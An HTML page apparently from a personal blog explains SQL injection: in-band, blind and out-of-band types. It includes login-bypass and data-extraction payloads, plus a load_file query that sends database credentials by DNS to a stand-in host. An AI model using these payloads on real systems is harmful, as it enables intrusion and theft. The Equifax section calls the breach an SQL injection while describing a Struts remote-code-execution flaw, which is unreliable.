@@ -1,0 +1,95 @@
+<!DOCTYPE HTML>
+<!--
+	Solid State by HTML5 UP
+	html5up.net | @ajlkn
+	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+-->
+<html>
+	<head>
+		<title>Blogpost4 - Jude Wakim</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="assets/css/main.css" />
+		<noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
+	</head>
+	<body class="is-preload">
+
+		<!-- Page Wrapper -->
+			<div id="page-wrapper">
+
+				<!-- Wrapper -->
+					<section id="wrapper">
+						<header>
+							<div class="inner">
+								<h2>Blog Post 4: SQL Injection Attacks</h2>
+								<p>In this blogpost I will discuss SQL injection attacks. I cover what they are, why and how hackers use them, the different variations of them, then I will give some examples and references. I will eventually make another blogpost about how to defend against them.</p>
+							</div>
+						</header>
+
+						<!-- Content -->
+							<div class="wrapper">
+								<div class="inner">
+
+									<section>
+										<h4 class="major">What (and why) is an SQL Injection:</h4>
+										<p>OWASP, The Open Worldwide Application Security Project, says that an SQL injection is basically the insertion or "injection" of an SQL query into a user input field of an application. Think of a web application that asks you to input your username and password. If you enter the credentials properly the web app will query a database with the username and password you provided. If the database has matching credentials then the query is successful and you are able to get to the next page of the web app.<br><br>Here is an example:<br>The web application asks you to enter your username and password and you do. Let's say the username is "john" and the password is "supersecretpassword". The web application will use the username and password information and create an SQL query that looks like this: <code>SELECT * FROM users WHERE username = 'john' AND password = 'supersecretpassword'</code>. (I hope you understand basic SQL syntax because the blogpost will not explain that.) So if that query returns an entry in the database the user is logged and good to go.<br><br>Okay, but what happens if the user decides to do an SQL injection attack instead of just entering the credentials?<br>If the user, when prompted for the username and password, enters something like <code>'' OR 1=1 -- -</code> for the username and <code>supersecretpassword</code> for the password then the web app will create an SQL query like <code>SELECT * FROM users WHERE username = ‘’ OR 1=1 -- - AND password = 'supersecretpassword'</code> and query the database with that. Now in layman's words that query says "select all entries from the users database table where the username is empty or one equals one." Now obviously one always equals one so the query will always be true and will probably take the first entry in the database and say "yup, you're good to go" and the web app will let you in.<br><br>"wHat abOUt thE pAssWorD paRt of ThE quEry??"<br><br>Yeah so, the <code>-- -</code> part of the query is the comment symbol so everything after it becomes a comment and does not actually get read, it just gets ignored.<br><br>That is basic example of an SQL injection attack.</p>
+									</section>
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <section>
+										<h4 class="major">Types of SQL Injection attacks</h4>
+										<p>I will talk about three differnet types of SQL Injection attacks:<br><br>In-band (a.k.a classic)<br>Blind (a.k.a infernetial)<br>Out-of-band<br><br>In-band SQLi:<br>In-band SQL injections are when an SQL query is sent and responded to on the same communication channel. This is the classic way. The example described above is in-band. Here is another example to drive it home:<br><br>Let's say the web application is asking you for a user ID and you enter this: <code>%'--</code>. The SQL query that gets created reads <code>SELECT * FROM users WHERE user_id LIKE '%'--'</code> which is layman's terms is "select everything from the users database table where the user_id is similar to  zero, one, or multiple characters." The percent sign is a wildcard (google it) and everything after the <code>--</code> is ignored so basically the application should display the contents of the entire users table. If it does that and just returns the entire users table right there on the same web browser then thats a classic SQLi or in-band SQLi.<br><br>Out-of-band SQLi:<br>Out-of-band SQL injections are when the attacker gets the response sent to a remote endpoint that they control. This type of SQLi is possible if the server that the attacker is using has commands that trigger DNS or HTTP requests. Here's an example:<br><br>The user is able to execute <code>SELECT load_file(CONCAT('\\\\',(SELECT+@@version),'.',(SELECT+user),'.', (SELECT+password),'.',example.com\\test.txt'))</code> into a web application. This attacker is exfiltrating the database version, a username, and password then uses the load_file function on the server to create a domain name, putting the exfiled data in the request. The command sends a DNS request to the domain database_version.database_user.database_password.example.com giving the attacker the version of the database, a username, and password. This type of attack is more complicated than an in-band attack.<br><br>Blind SQLi:<br>Blind SQL injections or inferential SQL injections is when the attacker does not receive an obvious response for the database. Instead, the attacker slowly understands the behavior of the server and the application and once the attacker understands it they can manipulate it. This type of SQLi takes much more time. There are two different types of blind SQLi's: boolean-based and time-based attacks. So a boolean-based injection looks like this:<br><br>An attacker modifies a query to return either a true or a false reponse and observes how the application behaves. If a application shows a specific mesage when <code>'1=1'</code> is true but a different one when <code>'1=2'</code> is false, then the attacker knows they can exploit this to extract information. First, the attacker will use the application properly and get some real information from the database like that there is product_ID that has the value of 42, let's say. Then the attacker will try this query: <code>SELECT * FROM products WHERE id = 42 and 1=1</code><code>SELECT * FROM products WHERE id = 42 and 1=0</code> and concatenate them together. If the app behaves differently then the attacker would do something like this: <code>42 AND (SELECT TOP 1 substring(name, 1, 1)
+  FROM sysobjects
+  WHERE id=(SELECT TOP 1 id
+    FROM (SELECT TOP 1 id
+      FROM sysobjects
+      ORDER BY id)
+    AS subq
+    ORDER BY id DESC)) = 'a'</code> when asked to input a product_ID value. This SQL code, in summary, checks whether there's an object in the database whose name starts with the letter 'a'. Then the attacker will continue with all the letters in the alphabet. Eventually the attacker will get the full name of the first table in the database structure. They can continue in a similar fashion until they know enough about the structure of the database and can extract data from the table. On the other hand, in time-based blind injections, an attacker sends SQL queries that force the database to wait for an alloted time before responding and if it does actually wait then the attacker knows the query is true. An example is that if an attacker injects this query: <code>'IF(1=1) WAITFOR DELAY '0:0:10' --'</code> and the application is actually delayed 10 seconds they can repeat this process to gain information little by little until they have actionable information about the database and its structure and can leverage the information to extract data. Continuing with the first product_ID example, if when asked for a product_ID value the attacker enters <code>42; IF(EXISTS(SELECT TOP 1 *
+		FROM sysobjects
+		WHERE id=(SELECT TOP 1 id
+		  FROM (SELECT TOP 1 id 
+			FROM sysobjects 
+			ORDER BY id) 
+		  AS subq
+		  ORDER BY id DESC)
+		AND ascii(lower(substring(name, 1, 1))) = 'a'))
+		WAITFOR DELAY '0:0:10'</code> and the first table in the database structure does begin with the letter 'a' then the application will delay 10 seconds. Then this gets repeated until the name of that first table is discovered. This type of SQLi is way slower but at the end of the day will get you the same results.</p>
+									</section>
+									<section>
+										<h4 class="major">Story of an SQL Injection Attack: Equifax Breach 2017</h4>
+										<p>In 2017, Equifax was a victim of an SQL Injection attack taht affected ~147 million people across the US, UK, and Canada. Social security numbers, birthdates, addresses, credit card information, and drivers license numbers were exposed. The breach occured between May and July of 2017 and was publicly disclosed September 7, 2017. The breach was caused by a vulnerability (CVE-2017-5638) in Apache Struts, a widely-used open-source web application framework. The specific vulnerability was in the framework's handling of file uploads via the Jakarta Multipart parser. This vulnerability was disclosed and patched in March 2017, but Equifax failed to apply the patch to their systems in a timely manner. The flaw was a Remote Code Execution (RCE) vulnerability, meaning the crafted request could trick the server into running the attacker's code. The attacker sent this malicious HTTP request to Equifax’s web server. Because the server was running a version of Apache Struts with the vulnerability, it mistakenly executed the attacker's code. The server didn't just process the request as data but actually ran the code that was embedded in the request. This allowed the attackers to execute commands directly on Equifax's server.</p>
+									</section>
+									<section>
+										<h4 class="major">Documentation</h4>
+										<p>SQL Injection Payload List: https://github.com/payloadbox/sql-injection-payload-listSQL
+									<br><br>HTTP request where the User-Agent field contains an SQL injection attack:
+										<br>GET /vulnerable-page HTTP/1.1
+										<br>Host: example.com
+										<br>User-Agent: Mozilla/5.0<code>' OR 1=1; --</code>
+										<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+										<br>Accept-Language: en-US,en;q=0.5
+										<br>Accept-Encoding: gzip, deflate
+										<br>Connection: keep-alive
+										<br>Upgrade-Insecure-Requests: 1
+									<br><br>Keywords/Special Characters to look out for: 
+										<br><code>%</code>	 Represents zero or more characters
+										<br><code>_</code>	 Represents a single character
+										<br><code>[]</code>	 Represents any single character within the brackets
+										<br><code>^</code>	 Represents any character not in the brackets
+										<br><code>-</code>	 Represents any single character within the specified range
+										<br><code>{}</code>	 Represents any escaped character</p>
+									</section>
+			</div>
+
+		<!-- Scripts -->
+			<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/jquery.scrollex.min.js"></script>
+			<script src="assets/js/browser.min.js"></script>
+			<script src="assets/js/breakpoints.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<script src="assets/js/main.js"></script>
+
+	</body>
+</html>
